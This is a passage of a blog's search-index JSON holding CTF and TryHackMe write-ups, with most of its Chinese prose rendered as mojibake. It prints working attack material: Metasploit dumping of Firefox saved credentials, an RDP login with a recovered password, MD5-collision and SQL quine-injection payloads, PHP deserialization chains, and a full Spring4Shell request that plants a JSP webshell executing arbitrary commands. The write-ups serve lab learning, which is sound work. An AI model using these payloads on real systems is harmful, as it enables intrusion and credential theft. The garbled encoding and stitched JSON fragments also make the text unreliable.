æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå·²çŸ¥è·¯å¾„ä¼šé»˜è®¤ä¿å­˜firefox æµè§ˆå™¨çš„ç¼“å­˜ åœ¨è¿›è¡Œè°·æ­Œæœç´¢ä¹‹åæˆ‘ä»¬ä¼šæ‰¾åˆ°å¦‚ä¸‹è·¯å¾„ï¼š C:\\Users\\{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ åœ¨æœ¬å®éªŒä¸­useræ˜¯natbatï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ä»¥ä¸‹è·¯å¾„å¯ä»¥æ‰¾åˆ°æµè§ˆå™¨ç¼“å­˜æ–‡ä»¶ã€‚ C:\\Users atbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ è¿™é‡Œå¯ä»¥åˆ©ç”¨msfçš„æ¨¡å—æ¥åˆ©ç”¨ï¼Œé‚£è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬ä½¿ç”¨msfç›‘å¬ æ¥ç€æŒ‚åˆ°åå°ï¼Œåˆ©ç”¨post/multi/gather/firefox_credsæ¨¡å— æœ€ç»ˆå¾—åˆ°å¦‚ä¸Šæ•°æ®ï¼Œç”±ä¸Šå›¾å¯çŸ¥è½¬å­˜å‚¨çš„æ–‡ä»¶åœ¨/root/.msf4/loot/è·¯å¾„ä¸‹ å¹¶ä¸”å¯çŸ¥è¿™äº›æ–‡ä»¶çš„åˆå§‹åç§°ä¸ºcert9.dbã€cookies.sqliteã€key4.dbå’Œ logins.json Firefox å­˜å‚¨æ–‡ä»¶è§£å¯†è„šæœ¬ï¼ˆä»¥ä¸‹ä¸¤ä¸ªè„šæœ¬éƒ½å¯ä½¿ç”¨ï¼Œæœ¬æ–‡é€‰æ‹©ä½¿ç”¨ç¬¬ä¸€ä¸ªï¼‰ï¼š https://github.com/lclevy/firepwd https://github.com/unode/firefox_decrypt å¾—åˆ°ç«™ç‚¹çš„ç™»é™†å¯†ç ï¼Œæ¥ç€ä»–ä»¬æƒ³åˆ°äº†3389ç™»å½•ã€‚ã€‚ã€‚ã€‚ xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:10.10.71.25 æ¡Œé¢å‘ç°flag æ€»ç»“ é¦–å…ˆæ˜¯å¸¸è§„æ‰«æï¼Œå‘ç°å­˜åœ¨SMBç«¯å£ï¼Œ3389ä»¥åŠä¸€ä¸ªç±»ä¼¼èŠå¤©åŠŸèƒ½çš„ç«¯å£31337ã€‚é¦–å…ˆæ˜¯æšä¸¾äº†SMBï¼Œå‘ç°å­˜åœ¨exeäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°ï¼Œncåˆ°ç«¯å£æµ‹è¯•ï¼Œå‘ç°ä¼šè¿›è¡ŒèŠå¤©å›å¤ç­‰åŠŸèƒ½ã€‚å°è¯•å‘é€å¤§é‡å­—ç¬¦ä¸²ï¼Œå‘ç°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºã€‚ æ¥ç€å°±æ˜¯æ”¾åˆ°æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œæ€è·¯å¸¸è§„ï¼Œä½†æœ€ç»ˆæ‹¿flagçš„æ—¶å€™ï¼Œé‡åˆ°æ–°å§¿åŠ¿ï¼Œåœ¨ç®€å•çš„æ‹¿åˆ°user.txtçš„æ—¶å€™ï¼Œæ‰¾ä¸åˆ°root.txtï¼Œæ²¡æ€è·¯ä¹‹åï¼Œçœ‹äº†wpï¼Œå‘ç°å½“å‰ç›®å½•æœ‰ä¸€ä¸ªç«ç‹æµè§ˆå™¨çš„å¿«æ·é”®ï¼Œäºæ˜¯å¯ä»¥æƒ³åˆ°ï¼Œè½¬å‚¨é‡Œé¢çš„ç¼“å­˜æ•°æ®ï¼Œå¯èƒ½ä¼šæœ‰æ•æ„Ÿä¿¡æ¯ï¼Œç„¶åå°±é¡ºå…¶è‡ªç„¶çš„ï¼Œè½¬ä¸ºmsfçš„shellï¼Œç”¨å…¶ä¸­çš„firefox_credsæ¨¡å—ã€‚dumpå…¶ä¸­çš„æ•°æ®ï¼Œæ¥ç€åˆ©ç”¨ä¸“ç”¨firefoxè§£å¯†è„šæœ¬ï¼Œå¯ä»¥è§£å¯†å¾—åˆ°å…¶ä¸­çš„æ•°æ®ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªwebç«™ç‚¹çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œäºæ˜¯æƒ³åˆ°3389è¿œç¨‹ç™»é™†ï¼Œå‘ç°æˆåŠŸï¼Œæ¡Œé¢å­˜åœ¨root.txt","tags":["tryhackme"],"categories":["tryhackme"]},{"title":"NUSTCTF","path":"/2024/03/27/nustctf/","content":"[NUSTCTF 2022 æ–°ç”Ÿèµ›]ezProtocol webåŸºç¡€+md5å¼ºç¢°æ’ &lt;?php function readmyfile($path){ $fh = fopen($path, \"rb\"); $data = fread($fh, filesize($path)); fclose($fh); return $data; } echo \"äºŒè¿›åˆ¶md5åŠ å¯†: \". md5( (readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\1.txt\"))); echo \" \";echo \" \"; echo 'urlç¼–ç : '. urlencode(readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\1.txt\")); echo \" \";echo \" \"; echo 'äºŒè¿›åˆ¶md5åŠ å¯†: '.md5( (readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\2.txt\"))); echo \" \";echo \" \"; echo 'urlç¼–ç : '. urlencode(readmyfile(\"F:\\\\tools\\\\fastcoll-md5\\\\2.txt\")); p1=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%8C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%A5%5Dv%C4W%D2%A9%1E%84-%1D%09%1B%92%40%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%3A%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE%B5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5EA%5E%E2%04%28&amp;p2=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%0C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%25%5Ev%C4W%D2%A9%1E%84-%1D%09%1B%92%C0%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%BA%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5E%C1%5E%E2%04%28 æ•°æ®åŒ…å¦‚ä¸‹ POST / HTTP/1.1 Host: node5.anna.nssctf.cn:28243 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 x-forwarded-for: 127.0.0.1 referer: http://localhost/ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: session-name=MTcwOTM2NzI0MXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV2QxWlhOMHxn2BL7QhgGFpfSARDtqfCjwHVcRGviwJyWSnQhXDN9sw==; dinner=big%20meal Connection: close Content-Length: 1006 username=admin&amp;p1=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%8C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%A5%5Dv%C4W%D2%A9%1E%84-%1D%09%1B%92%40%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%3A%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE%B5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5EA%5E%E2%04%28&amp;p2=hacker%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1BB%0D%CC%89g%3D%2F%C3T%22%91V%DAc%A3i%BEu%0C%2B%8Eu%B3%1DZ8Ju%A4%19%5C%B0%13%E9%E4%CE%E93MK%ECdZ%DF%25%5Ev%C4W%D2%A9%1E%84-%1D%09%1B%92%C0%23%5DK%E0%EC%F9q%E6%25%29%AF%BFiJ%28%F1%05%18%16%1D%D6%AA%21%BA%05%3E%C1X%D9%3B%F5%CCT2%5D.%81c%D6%F5%27%8B%A3%C2%8DC%A1%0F%BE5j%A8%D4%CAw%8Bt.%25%2Cc%D4%5E%C1%5E%E2%04%28 [NUSTCTF 2022 æ–°ç”Ÿèµ›]Ezjava1 @Controller public class HelloController { public HelloController() { } @RequestMapping({\"/hello\"}) public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception { ModelAndView mav = new ModelAndView(\"index\"); mav.addObject(\"message\", \"Do you know \\\"beans\\\"?\"); return mav; } @PostMapping({\"/index\"}) public void postIndex(@ModelAttribute EvalBean evalBean, Model model) { System.out.println(\"@POST Called\"); } @GetMapping({\"/index\"}) public void getIndex(@ModelAttribute EvalBean evalBean, Model model) { System.out.println(\"@GET Called\"); } @RequestMapping({\"/addUser1\"}) @ResponseBody public String addUser(User user) throws IOException { System.out.println(user.getDepartment().getName1()); if (user.getDepartment().getName1().contains(\"njust\") &amp;&amp; user.getName().contains(\"2022\")) { return \"flag{1}\"; } else { String var10002 = user.getDepartment().getName1(); File f = new File(\"../webapps/ROOT/\" + var10002 + user.getName() + \".njust.jsp\"); return f.exists() ? \"flag{2}\" : user.getName(); } } } é™„ä»¶ç»™äº†æºç ï¼Œåˆ†æä¸€æ³¢ è¿™é‡Œé¢˜ç›®æç¤ºæˆ‘ä»¬ç›®æ ‡æ˜¯è·å¾—flag{1}ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹addUser1è·¯ç”±å³å¯ ä»–è¿™é‡Œè¯´æ¥å—ä¸€ä¸ªUserå¯¹è±¡å‚æ•°ï¼Œç„¶ååˆ¤æ–­è¯¥å¯¹è±¡ä¸­çš„getDepartment().getName1()å±æ€§å€¼æ˜¯å¦åŒ…å«æˆ–ç­‰äºnjustä¸”getName()å±æ€§å€¼æ˜¯å¦åŒ…å«æˆ–ç­‰äº2022ï¼Œå¦‚æœç¬¦åˆçš„è¯ï¼Œå°±è¿”å›flag{1} ç”±äºè¿™é‡Œæ²¡æœ‰æŒ‡å®šæ˜¯getè¿˜æ˜¯postä¼ å‚ï¼Œå› æ­¤æˆ‘ä»¬ä»»é€‰ä¸€ä¸ªå³å¯ã€‚è¿™é‡Œå¯¹äºSpring MVCæ¡†æ¶ä¸å¤ªç†Ÿæ‚‰ï¼Œä¼ å‚æœºåˆ¶ä¸æ˜ç™½ï¼Œè¯¢é—®GPTå¦‚ä¸‹ï¼š å½“å‘\"/addUser1\"è·¯ç”±å‘é€ä¸Šè¿°GETè¯·æ±‚æ—¶ï¼Œè¯·æ±‚ä¸­åŒ…å«äº†æŸ¥è¯¢å‚æ•°ï¼ˆQuery Parametersï¼‰ï¼Œå…¶ä¸­åŒ…æ‹¬äº†department.name1å’Œnameä¸¤ä¸ªå‚æ•°ã€‚ æ ¹æ®Spring MVCçš„å·¥ä½œåŸç†ï¼Œå½“æ¥æ”¶åˆ°è¯¥GETè¯·æ±‚æ—¶ï¼ŒSpring MVCæ¡†æ¶ä¼šè‡ªåŠ¨å°†æŸ¥è¯¢å‚æ•°çš„å€¼ä¸æ–¹æ³•å‚æ•°è¿›è¡Œç»‘å®šã€‚ åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæ–¹æ³•å‚æ•°ä¸ºUserå¯¹è±¡ï¼Œå› æ­¤æ¡†æ¶ä¼šå°è¯•å°†æŸ¥è¯¢å‚æ•°çš„å€¼ç»‘å®šåˆ°Userå¯¹è±¡çš„å¯¹åº”å±æ€§ä¸Šã€‚å…·ä½“çš„ç»‘å®šè¿‡ç¨‹å¦‚ä¸‹ï¼š department.name1 å‚æ•°çš„å€¼ä¸º â€œxxxnjustxxxâ€ã€‚æ ¹æ®Userå¯¹è±¡çš„å±æ€§å‘½åè§„åˆ™ï¼Œæ¡†æ¶ä¼šå°è¯•å°†è¯¥å€¼ç»‘å®šåˆ°Userå¯¹è±¡çš„departmentå±æ€§çš„name1å±æ€§ä¸Šã€‚ name å‚æ•°çš„å€¼ä¸º â€œxxx2022xxxâ€ã€‚åŒæ ·ï¼Œæ¡†æ¶ä¼šå°è¯•å°†è¯¥å€¼ç»‘å®šåˆ°Userå¯¹è±¡çš„nameå±æ€§ä¸Šã€‚ é€šè¿‡è¿™æ ·çš„å‚æ•°åä¸å±æ€§åçš„å¯¹åº”å…³ç³»ï¼ŒSpring MVCæ¡†æ¶ä¼šè‡ªåŠ¨å°†æŸ¥è¯¢å‚æ•°çš„å€¼èµ‹ç»™Userå¯¹è±¡çš„ç›¸åº”å±æ€§ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œdepartment.name1 çš„å€¼ â€œxxxnjustxxxâ€ ä¼šè¢«èµ‹ç»™Userå¯¹è±¡çš„departmentå±æ€§çš„name1å±æ€§ï¼Œname çš„å€¼ â€œxxx2022xxxâ€ ä¼šè¢«èµ‹ç»™Userå¯¹è±¡çš„nameå±æ€§ã€‚ å› æ­¤ï¼Œå½“å‘\"/addUser1\"è·¯ç”±å‘é€ä¸Šè¿°GETè¯·æ±‚æ—¶ï¼Œé€šè¿‡æŸ¥è¯¢å‚æ•°çš„å€¼ï¼Œå¯ä»¥ä¸ºUserç±»ä¸­çš„å±æ€§èµ‹å€¼ã€‚ Spring MVCæ¡†æ¶çš„æ•°æ®ç»‘å®šæœºåˆ¶ä¸ä¼šå—åˆ°å±æ€§çš„è®¿é—®ä¿®é¥°ç¬¦ï¼ˆå¦‚privateã€protectedç­‰ï¼‰çš„å½±å“ã€‚å³ä½¿å±æ€§æ˜¯privateçš„ï¼ŒSpring MVCä»ç„¶å¯ä»¥é€šè¿‡åå°„æœºåˆ¶æ¥è®¿é—®å’Œè®¾ç½®ç§æœ‰å±æ€§çš„å€¼ã€‚ Spring MVCä½¿ç”¨Javaåå°„æœºåˆ¶æ¥è·å–å’Œè®¾ç½®å¯¹è±¡çš„å±æ€§å€¼ï¼Œè€Œä¸ä¾èµ–äºå±æ€§çš„è®¿é—®ä¿®é¥°ç¬¦ã€‚é€šè¿‡åå°„ï¼Œæ¡†æ¶å¯ä»¥ç»•è¿‡è®¿é—®ä¿®é¥°ç¬¦çš„é™åˆ¶ï¼Œç›´æ¥è®¿é—®å’Œä¿®æ”¹å¯¹è±¡çš„ç§æœ‰å±æ€§ã€‚è¿™ä½¿å¾—Spring MVCèƒ½å¤Ÿåœ¨ç»‘å®šè¯·æ±‚å‚æ•°æ—¶ï¼Œæ— è®ºå±æ€§æ˜¯privateè¿˜æ˜¯publicï¼Œéƒ½èƒ½æˆåŠŸåœ°å°†å‚æ•°å€¼èµ‹ç»™å¯¹è±¡çš„å±æ€§ã€‚ å› æ­¤ï¼Œå³ä½¿Userç±»ä¸­çš„å±æ€§æ˜¯privateï¼ŒSpring MVCä»ç„¶å¯ä»¥æˆåŠŸåœ°å°†æŸ¥è¯¢å‚æ•°çš„å€¼ç»‘å®šåˆ°å¯¹åº”çš„ç§æœ‰å±æ€§ä¸Šï¼Œå®ç°å±æ€§èµ‹å€¼çš„åŠŸèƒ½ã€‚è¿™ç§æœºåˆ¶ä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥æ›´çµæ´»åœ°è®¾è®¡ç±»çš„å±æ€§ï¼Œå¹¶ä¸éœ€è¦å°†å±æ€§è®¾ç½®ä¸ºpublicæ¥å®ç°æ•°æ®ç»‘å®šã€‚åŒæ—¶ï¼Œé€šè¿‡å°è£…å±æ€§çš„è®¿é—®ï¼Œå¯ä»¥æ›´å¥½åœ°æ§åˆ¶å±æ€§çš„å¯è®¿é—®æ€§å’Œå®‰å…¨æ€§ã€‚ å› æ­¤æˆ‘ä»¬æœ€ç»ˆpayloadä¸ºï¼š/addUser1?department.name1=njust&amp;name=2022å³å¯å¾—åˆ°flag [NUSTCTF 2022 æ–°ç”Ÿèµ›]Translate çœ‹é¡µé¢æºç å‘ç°test.php &lt;?php include_once(\"fun.php\"); //æˆ‘çš„å®¤å‹æ¿é¸­æŠŠflagè—åˆ°flag.phpé‡Œäº† highlight_file(__FILE__); error_reporting(0); $file = $_GET['file']; if (!is_file($file)) { highlight_file(filter($file)); } else { echo \"æˆ‘å®¤å‹è¯´äº†ï¼Œä¼šæœ‰å¤§åè›‹æ¥æ•²é—¨!\"; } è¿™é‡Œå°è¯•ä¼ªåè®®ï¼Œä½†å‘ç°è¿‡æ»¤äº†å¾ˆå¤šï¼Œç›´æ¥ä¸Šå­—å…¸å»fuzzï¼Œå¦‚ä¸‹å›¾ä¹Ÿæ˜¯æˆåŠŸfuzzåˆ°ï¼Œpayloadå¦‚ä¸‹ ?file=php://filter/UCS-4%2a/resource=flag.php è¿™é‡Œçœ‹flag.phpï¼Œå‘ç°æ˜¯è¿›è¡ŒpasswordæŸ¥è¯¢çš„éªŒè¯ï¼Œè¿™å¾ˆå®¹æ˜“æƒ³åˆ°ä¹‹å‰çš„quineæ³¨å…¥ï¼ˆåˆšåšè¿‡ã€‚ã€‚ï¼‰ é‚£ç›´æ¥å¼€å§‹æµ‹è¯•å§ï¼Œå¦‚ä¸‹å›¾ï¼Œå‘ç°ç”¨æˆ·ååªèƒ½æ˜¯admin è¿™é‡Œåœ¨è¾“å…¥åŸpayloadçš„æ—¶å€™ï¼Œå‘ç°è¿‡æ»¤äº†charã€ç©ºæ ¼ã€â€“+ç­‰å…³é”®å­—ï¼Œè™½ç„¶charå¯ä»¥ç”¨chræ›¿æ¢ï¼Œä½†è¯•äº†è¯•å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œçœ‹äº†wpå‘ç°å¯ä»¥ç”¨16è¿›åˆ¶ç»•è¿‡ã€‚ 1'union/**/select/**/replace(REPLACE('1\"union/**/select/**/replace(REPLACE(\".\",0x22,0x27),0x2e,\".\")#',0x22,0x27),0x2e,'1\"union/**/select/**/replace(REPLACE(\".\",0x22,0x27),0x2e,\".\")#')# [NUSTCTF 2022 æ–°ç”Ÿèµ›]Ezjava2 è¿™é‡Œä¸Ezjava1ç¯å¢ƒç›¸åŒï¼Œåªä¸è¿‡è¦è·å–çš„æ˜¯flag{2}ï¼Œè¿™é‡Œå®¡äº†ä»£ç æ²¡å•¥æ€è·¯ï¼Œæºç é‡Œé¢ä¹Ÿæ‰¾ä¸åˆ°å…³äºnjust.jspç›¸å…³çš„ä¿¡æ¯ï¼Œåªèƒ½çœ‹wpï¼Œå‘ç°æ²¡æœ‰æ³¨æ„åˆ°waråŒ…çš„åå­—ï¼Œè¿™å¾ˆæš—ç¤ºç€æˆ‘ä»¬è¿™é‡Œæœ‰ä¸€ä¸ªspringæ¼æ´ æ¥ç€googleå…³é”®è¯æœç´¢spring4shellï¼Œæ‰¾åˆ°äº†ä¸€ç³»åˆ—RCEæ–‡ç« ä»¥åŠpocè„šæœ¬ï¼Œå…·ä½“åŸç†åˆ†æå¯å‚è€ƒæ–‡ç« ï¼š Spring è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰åŸç†åˆ†æå’Œæ€è€ƒ æ€»çš„æ¥è¯´ï¼Œæ¼æ´æ€è·¯å°±æ˜¯ï¼š é€šè¿‡è¯·æ±‚ä¼ å…¥çš„å‚æ•°ï¼Œåˆ©ç”¨SpringMVCå‚æ•°ç»‘å®šæœºåˆ¶ï¼Œæ§åˆ¶äº†Tomcat AccessLogValveçš„å±æ€§ï¼Œè®©Tomcatåœ¨webapps/ROOTç›®å½•è¾“å‡ºå®šåˆ¶çš„â€œè®¿é—®æ—¥å¿—â€tomcatwar.jspï¼Œè¯¥â€œè®¿é—®æ—¥å¿—â€å®é™…ä¸Šä¸ºä¸€ä¸ªJSP webshellã€‚ è¿™é‡Œæˆ‘ä¹Ÿçœ‹ä¸å¤ªæ‡‚åˆ†æåŸç†ï¼Œç›´æ¥å°±è„šæœ¬å°å­äº†ï¼šhttps://github.com/reznok/Spring4Shell-POC è¿™é‡Œæ˜¯æˆ‘ç¯å¢ƒé—®é¢˜ï¼Œå¤ç°ä¹Ÿä¸æˆåŠŸäº†ï¼Œè¿™é‡Œä½¿ç”¨vulhubæ¥å¤ç°å§ æ­å»ºæˆåŠŸå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©æ‰‹æ‰“ï¼Œä¹Ÿå¯ä»¥pocè„šæœ¬ï¼Œè¿™é‡Œæˆ‘å…ˆå±•ç¤ºæ‰‹æ‰“ GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1 Host: localhost:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Connection: close suffix: %&gt;// c1: Runtime c2: &lt;% DNT: 1 ä¹‹åè®¿é—®å¯¹åº”jsp webshellï¼Œå³å¯RCEï¼Œè¿™é‡Œç”¨pocè„šæœ¬çš„æ—¶å€™ï¼Œå‘ç°æ­çš„é¶åœºå‡ºé—®é¢˜äº†ï¼Œå¤ç°ä¸å‡ºæ¥ï¼Œåªå¥½é‡æ–°æ‹‰ä¸€ä¸ª","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"GDOUCTF2023","path":"/2024/03/26/gdouctf-2023/","content":"[GDOUCTF 2023]EZ WEB F12è®¿é—®srcçœ‹åˆ°æºç  import flask app = flask.Flask(__name__) @app.route('/', methods=['GET']) def index(): return flask.send_file('index.html') @app.route('/src', methods=['GET']) def source(): return flask.send_file('app.py') @app.route('/super-secret-route-nobody-will-guess', methods=['PUT']) def flag(): return open('flag').read() è¿™é‡Œè¯´ç”¨PUTæ–¹æ³•è®¿é—®å¯¹åº”è·¯ç”±ï¼Œç›´æ¥å¾—åˆ°flag [GDOUCTF 2023]hate eat snake è¿™é‡Œä¸çŸ¥é“ä¸ºä½•æˆ‘ä¿å­˜åœ¨æœ¬åœ°è¿è¡Œä¸èµ·æ¥ï¼Œæ‡’å¾—è°ƒè¯•äº†ï¼Œç›´æ¥å¯¹ç€ä»£ç åˆ†æ å®¹æ˜“æ‰¾åˆ°scoreå…³é”®è¯ï¼Œçœ‹ä¸‹é¢ä»£ç ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å°†scoreä¿®æ”¹ä¸ºå¤§çš„æ•°å­—ï¼Œè¿è¡Œå³å¯ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™é‡Œçœ‹åˆ°ç–‘ä¼¼flagï¼Œä¸è¿‡è¢«jsæ··æ·†äº†ï¼Œè¿™é‡Œå¯ä»¥ä¿®æ”¹getscore&gt;è´Ÿæ•°ï¼Œå³å¯ï¼Œæˆ–è€…ç›´æ¥å¤åˆ¶è¿™æ®µå‡½æ•°åˆ°æ§åˆ¶å°ï¼Œç„¶åè¾“å‡ºalertå³å¯ã€‚ [GDOUCTF 2023]æ³„éœ²çš„ä¼ªè£… &lt;?php error_reporting(0); if(isset($_GET['cxk'])){ $cxk=$_GET['cxk']; if(file_get_contents($cxk)==\"ctrl\"){ echo $flag; }else{ echo \"å¨²æ¥ç¤‚é«â€³æƒ‚\"; } }else{ echo \"nononoononoonono\"; } ?&gt; è®¿é—®www.rarå¾—åˆ°æºç ç½‘å€ï¼Œä¼ªåè®®ä¼ å…¥å³å¯ [GDOUCTF 2023]å—ä¸äº†ä¸€ç‚¹ &lt;?php error_reporting(0); header(\"Content-type:text/html;charset=utf-8\"); if(isset($_POST['gdou'])&amp;&amp;isset($_POST['ctf'])){ $b=$_POST['ctf']; $a=$_POST['gdou']; if($_POST['gdou']!=$_POST['ctf'] &amp;&amp; md5($a)===md5($b)){ if(isset($_COOKIE['cookie'])){ if ($_COOKIE['cookie']=='j0k3r'){ if(isset($_GET['aaa']) &amp;&amp; isset($_GET['bbb'])){ $aaa=$_GET['aaa']; $bbb=$_GET['bbb']; if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb){ $give = 'cancanwordflag'; $get ='hacker!'; if(isset($_GET['flag']) &amp;&amp; isset($_POST['flag'])){ die($give); } if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){ die($get); } foreach ($_POST as $key =&gt; $value) { $$key = $value; } foreach ($_GET as $key =&gt; $value) { $$key = $$value; } echo $flag; }else{ echo \"æ´—æ´—ç¡å§\"; } }else{ echo \"è¡Œä¸è¡Œå•Šç»†ç‹—\"; } } } else { echo 'èœèœ'; } }else{ echo \"å°±è¿™?\"; } }else{ echo \"åˆ«æ¥æ²¾è¾¹\"; } ?&gt; åˆ«æ¥æ²¾è¾¹ cookieçš„ä¼ å€¼è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œè‡³äºæœ€åçš„foreachå¾ªç¯ï¼Œä½œè€…åº”è¯¥æ˜¯å†™é”™äº†ï¼Œæ­£å¸¸æ¥è¯´åº”è¯¥åº”è¯¥æ˜¯ä¸‹é¢çš„payload http://node1.anna.nssctf.cn:28026?aaa=114514&amp;bbb=114514abc&amp;123=flag&amp;flag=123 POST DATA: ctf[]=1&amp;gdou[]=2&amp;123=flag&amp;flag=123 [GDOUCTF 2023]åæ–¹å‘çš„é’Ÿ &lt;?php error_reporting(0); highlight_file(__FILE__); // flag.php class teacher{ public $name; public $rank; private $salary; public function __construct($name,$rank,$salary = 10000){ $this-&gt;name = $name; $this-&gt;rank = $rank; $this-&gt;salary = $salary; } } class classroom{ public $name; public $leader; public function __construct($name,$leader){ $this-&gt;name = $name; $this-&gt;leader = $leader; } public function hahaha(){ if($this-&gt;name != 'one class' or $this-&gt;leader-&gt;name != 'ing' or $this-&gt;leader-&gt;rank !='department'){ return False; } else{ return True; } } } class school{ public $department; public $headmaster; public function __construct($department,$ceo){ $this-&gt;department = $department; $this-&gt;headmaster = $ceo; } public function IPO(){ if($this-&gt;headmaster == 'ong'){ echo \"Pretty Good ! Ctfer! \"; echo new $_POST['a']($_POST['b']); } } public function __wakeup(){ if($this-&gt;department-&gt;hahaha()) { $this-&gt;IPO(); } } } if(isset($_GET['d'])){ unserialize(base64_decode($_GET['d'])); } ?&gt; popé“¾å­å¦‚ä¸‹ &lt;?php class teacher{ public $name; public $rank; private $salary; } class classroom{ public $name; public $leader; } class school{ public $department; public $headmaster; } $pop = new school(); $pop-&gt;department = new classroom(); $pop-&gt;headmaster = 'ong'; $pop-&gt;department-&gt;name = 'one class'; $pop-&gt;department-&gt;leader = new teacher(); $pop-&gt;department-&gt;leader-&gt;name = 'ing'; $pop-&gt;department-&gt;leader-&gt;rank = 'department'; echo base64_encode(serialize($pop)); ?&gt; é“¾å­å¾ˆç®€å•ï¼Œä½†è¿™é‡Œæˆ‘æ²¡æœ‰æƒ³åˆ°åˆ©ç”¨åŸç”Ÿç±»æ¥åšï¼ˆåŸºæœ¬æ²¡é‡åˆ°è¿‡ï¼‰ä¹Ÿæ˜¯çœ‹äº†wpçŸ¥é“çš„ï¼Œç¿»äº†ç¿»ç¬”è®°è¿™æ ·å†™çš„ SplFileObject åŸç”Ÿç±» 